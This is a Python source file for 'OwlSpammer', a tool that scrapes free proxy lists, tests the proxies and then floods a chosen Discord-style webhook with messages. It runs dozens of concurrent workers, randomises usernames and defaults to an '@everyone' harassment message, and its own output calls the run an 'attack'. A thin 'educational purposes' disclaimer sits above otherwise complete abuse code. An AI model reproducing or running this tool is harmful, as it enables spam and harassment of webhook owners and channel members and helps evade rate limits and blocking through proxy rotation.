# © 2026 Venex. All rights reserved.
# All rights to the software, source code, documentation, and associated files are owned by Venex.
# Terms of Use: Use of these tools is authorized strictly for security assessments and educational purposes.
# Any misuse, especially for illegal activities, is strictly prohibited.
# The author assumes no liability for damages resulting from the use of these tools.
# Distribution: Unauthorized reproduction, modification, or redistribution of this software without explicit written permission from Venex is prohibited.


import os
import asyncio
import aiohttp
import random
import requests
from bs4 import BeautifulSoup
import threading
import time
from queue import Queue
import json

os.system('title OwlNetV1 - OwlSpammer')

from colorama import init, Fore, Style
init()
print(Fore.GREEN, end='')

class ProxyScraper:
    def __init__(self):
        self.proxy_sources = [
            'https://www.sslproxies.org/',
            'https://free-proxy-list.net/',
            'https://us-proxy.org/',
            'https://www.proxynova.com/proxy-server-list/'
        ]

    def scrape_proxies(self):
        proxies = []
        for source in self.proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                if 'sslproxies' in source or 'free-proxy' in source:
                    table = soup.find('table', {'class': 'table table-striped table-bordered'})
                    if table:
                        for row in table.find_all('tr')[1:101]:
                            cols = row.find_all('td')
                            if len(cols) >= 2:
                                ip = cols[0].text.strip()
                                port = cols[1].text.strip()
                                proxies.append(f"http://{ip}:{port}")
                elif 'proxynova' in source:
                    table = soup.find('table', {'id': 'tbl_proxy_list'})
                    if table:
                        for row in table.find_all('tr')[1:101]:
                            cols = row.find_all('td')
                            if len(cols) >= 2:
                                ip_script = cols[0].find('script')
                                if ip_script:
                                    ip_text = ip_script.text
                                    ip = ip_text.split("'")[1] if "'" in ip_text else cols[0].text.strip()
                                    port = cols[1].text.strip()
                                    proxies.append(f"http://{ip}:{port}")
            except Exception:
                continue
        return list(set(proxies))

class ProxyRotator:
    def __init__(self, proxies):
        self.proxies = proxies
        self.current_index = 0
        self.lock = threading.Lock()
        self.working_proxies = []
        self.test_proxies()

    def test_proxies(self):
        def test_proxy(proxy):
            try:
                test_url = "http://httpbin.org/ip"
                response = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=5)
                if response.status_code == 200:
                    self.working_proxies.append(proxy)
            except Exception:
                pass

        threads = []
        for proxy in self.proxies:
            t = threading.Thread(target=test_proxy, args=(proxy,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    def get_proxy(self):
        with self.lock:
            if not self.working_proxies:
                return None
            proxy = self.working_proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.working_proxies)
            return proxy

class WebhookSpammer:
    def __init__(self, webhook_url, proxy_rotator, message_content, num_threads=50):
        self.webhook_url = webhook_url
        self.proxy_rotator = proxy_rotator
        self.message_content = message_content
        self.num_threads = num_threads
        self.sent_count = 0
        self.running = False
        self.lock = threading.Lock()
        self.tasks = [] # To hold worker tasks for cancellation

    async def send_webhook_async(self, session, proxy):
        payload = {
            "content": self.message_content,
            "username": f"{USER}_{random.randint(1000,9999)}",
            "avatar_url": f"{AVATAR}",
        }
        try:
            # aiohttp expects the proxy string directly
            async with session.post(
                self.webhook_url,
                json=payload,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                if response.status == 204:
                    with self.lock:
                        self.sent_count += 1
                        if self.sent_count % 100 == 0:
                            print(f"Sent {self.sent_count} webhooks so far...")
                    return True
        except (aiohttp.client_exceptions.ClientError, asyncio.TimeoutError):
            # Silently handle connection errors and timeouts
            pass
        return False

    async def worker(self):
        # This loop will now be properly cancelled
        while self.running:
            proxy = self.proxy_rotator.get_proxy()
            if not proxy:
                await asyncio.sleep(1) # Wait if no proxies are available
                continue
            await self.send_webhook_async(session, proxy) # 'session' will be passed from run_workers
            await asyncio.sleep(0.01) # Small delay to avoid overwhelming

    def start_spam(self):
        self.running = True
        self.sent_count = 0
        # Run the asyncio event loop in a dedicated thread
        self.loop_thread = threading.Thread(target=self._run_async_loop)
        self.loop_thread.start()

    def _run_async_loop(self):
        asyncio.run(self._manage_workers())

    async def _manage_workers(self):
        async with aiohttp.ClientSession() as session:
            # Create a list of worker tasks
            self.tasks = [asyncio.create_task(self.worker_with_session(session)) for _ in range(self.num_threads)]
            try:
                # Wait for all tasks to complete (they won't, unless stopped)
                await asyncio.gather(*self.tasks)
            except asyncio.CancelledError:
                # This block will be executed when tasks are cancelled
                print("\nCancelling all worker tasks...")
                await asyncio.gather(*self.tasks, return_exceptions=True) # Ensure all tasks are cancelled
                print("All workers stopped.")

    async def worker_with_session(self, session):
        # Wrapper to pass the session to the worker
        while self.running:
            proxy = self.proxy_rotator.get_proxy()
            if not proxy:
                await asyncio.sleep(1)
                continue
            await self.send_webhook_async(session, proxy)
            await asyncio.sleep(0.01)

    def stop_spam(self):
        self.running = False
        # Cancel the asyncio tasks to stop the loop immediately
        if hasattr(self, 'tasks') and self.loop:
            for task in self.tasks:
                task.cancel()
        # Wait for the loop thread to finish
        if hasattr(self, 'loop_thread'):
            self.loop_thread.join()

def get_user_input():
    print(Style.RESET_ALL, end='')
    webhook_url = input("Enter WebHook URL: ").strip()
    if not webhook_url:
        print("Webhook URL is required!")
        exit()
    global USER
    USER = input("Enter WebHook USER: ").strip()
    if not USER:
        print("WebHook USER is required!")
        exit()
    global AVATAR
    AVATAR = input("Enter WebHook AVATAR URL: ").strip()
    if not AVATAR:
        AVATAR = "https://i.imgur.com/4M34hi2.png" # Default avatar if none provided
    try:
        thread_count = int(input("Enter number of Messages: ").strip() or "100")
    except ValueError:
        thread_count = 999999999
    message_content = input("Enter message to spam: ").strip()
    if not message_content:
        message_content = "# @everyone OwlSpammer is here to ruin your day! 🦉💥 # "
    return webhook_url, thread_count, message_content

def main():
    webhook_url, thread_count, message_content = get_user_input()
    print("\n" + "="*50)
    print("Starting OwlSpammer...")
    print("Gathering proxies and preparing attack...")
    scraper = ProxyScraper()
    raw_proxies = scraper.scrape_proxies()
    print(f"Found {len(raw_proxies)} proxies, testing for functionality...")
    rotator = ProxyRotator(raw_proxies)
    print(f"{len(rotator.working_proxies)} Proxies ready")
    if len(rotator.working_proxies) == 0:
        print("No working proxies found! Cannot start attack.")
        exit()

    print("\nStarting OwlSpammer attack...")
    print("Press CTRL+C to stop the attack")
    print("="*50 + "\n")
    spammer = WebhookSpammer(webhook_url, rotator, message_content, thread_count)

    try:
        spammer.start_spam()
        # Keep the main thread alive to listen for KeyboardInterrupt
        while spammer.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\nAttack stopped! Total webhooks sent: {spammer.sent_count}")
        spammer.stop_spam()
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        spammer.stop_spam() # Ensure cleanup on error
    finally:
        print("Exiting.")

if __name__ == "__main__":
    main()
